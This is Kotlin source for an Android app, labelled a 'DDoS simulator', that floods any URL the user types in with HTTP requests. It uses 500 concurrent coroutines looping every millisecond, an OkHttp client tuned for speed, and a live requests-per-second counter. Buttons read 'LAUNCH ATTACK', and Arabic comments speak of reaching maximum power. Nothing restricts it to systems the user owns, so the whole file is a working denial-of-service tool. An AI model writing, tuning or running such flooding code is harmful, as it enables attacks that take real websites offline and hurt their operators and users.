package com.example.ddossimulator

import android.graphics.Color
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import okhttp3.*
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class MainActivity : AppCompatActivity() {

    private var isAttacking = false
    private val attackJobs = mutableListOf<Job>()
    private val successCount = AtomicInteger(0)
    private val failCount = AtomicInteger(0)
    private var startTime: Long = 0
    
    // زيادة عدد المسارات بشكل كبير للوصول لأقصى طاقة
    private val threadCount = 500 

    // إعداد عميل OkHttp محسن للسرعة القصوى
    private val client = OkHttpClient.Builder()
        .connectionPool(ConnectionPool(500, 5, TimeUnit.MINUTES))
        .connectTimeout(500, TimeUnit.MILLISECONDS)
        .readTimeout(500, TimeUnit.MILLISECONDS)
        .writeTimeout(500, TimeUnit.MILLISECONDS)
        .retryOnConnectionFailure(false) // تعطيل الإعادة لتوفير الوقت
        .build()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val urlInput = findViewById<EditText>(R.id.urlInput)
        val startBtn = findViewById<Button>(R.id.startBtn)
        val successText = findViewById<TextView>(R.id.successText)
        val failText = findViewById<TextView>(R.id.failText)
        val totalText = findViewById<TextView>(R.id.totalText)
        val speedText = findViewById<TextView>(R.id.speedText)
        val statusLabel = findViewById<TextView>(R.id.statusLabel)

        startBtn.setOnClickListener {
            if (!isAttacking) {
                val targetUrl = urlInput.text.toString()
                if (targetUrl.isNotEmpty() && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
                    isAttacking = true
                    startBtn.text = "STOP ATTACK"
                    startBtn.setBackgroundColor(Color.parseColor("#333333"))
                    statusLabel.text = "STATUS: ULTRA ATTACK LIVE"
                    statusLabel.setTextColor(Color.parseColor("#FF0000"))
                    
                    startUltraAttack(targetUrl, successText, failText, totalText, speedText)
                } else {
                    statusLabel.text = "ERROR: INVALID URL"
                    statusLabel.setTextColor(Color.RED)
                }
            } else {
                isAttacking = false
                stopAttack()
                startBtn.text = "LAUNCH ATTACK"
                startBtn.setBackgroundColor(Color.parseColor("#FF0000"))
                statusLabel.text = "STATUS: STOPPED"
                statusLabel.setTextColor(Color.GRAY)
            }
        }
    }

    private fun startUltraAttack(
        targetUrl: String, 
        successView: TextView, 
        failView: TextView, 
        totalView: TextView, 
        speedView: TextView
    ) {
        successCount.set(0)
        failCount.set(0)
        startTime = System.currentTimeMillis()
        val scope = CoroutineScope(Dispatchers.IO)
        
        val request = Request.Builder()
            .url(targetUrl)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Cache-Control", "no-cache")
            .header("Connection", "keep-alive")
            .build()

        repeat(threadCount) {
            val job = scope.launch {
                while (isActive && isAttacking) {
                    client.newCall(request).enqueue(object : Callback {
                        override fun onFailure(call: Call, e: IOException) {
                            failCount.incrementAndGet()
                        }

                        override fun onResponse(call: Call, response: Response) {
                            if (response.isSuccessful) {
                                successCount.incrementAndGet()
                            } else {
                                failCount.incrementAndGet()
                            }
                            response.close() // ضروري جداً لتحرير الموارد فوراً
                        }
                    })
                    // تأخير ضئيل جداً لمنع انهيار التطبيق فوراً (يمكن تقليله حسب قوة الجهاز)
                    delay(1) 
                }
            }
            attackJobs.add(job)
        }

        CoroutineScope(Dispatchers.Main).launch {
            while (isAttacking) {
                val elapsedSeconds = (System.currentTimeMillis() - startTime) / 1000.0
                val success = successCount.get()
                val fail = failCount.get()
                val total = success + fail
                val rps = if (elapsedSeconds > 0) (total / elapsedSeconds).toInt() else 0
                
                successView.text = success.toString()
                failView.text = fail.toString()
                totalView.text = total.toString()
                speedView.text = rps.toString()
                
                delay(500)
            }
        }
    }

    private fun stopAttack() {
        attackJobs.forEach { it.cancel() }
        attackJobs.clear()
        // إلغاء جميع الطلبات المعلقة في OkHttp
        client.dispatcher.cancelAll()
    }
}
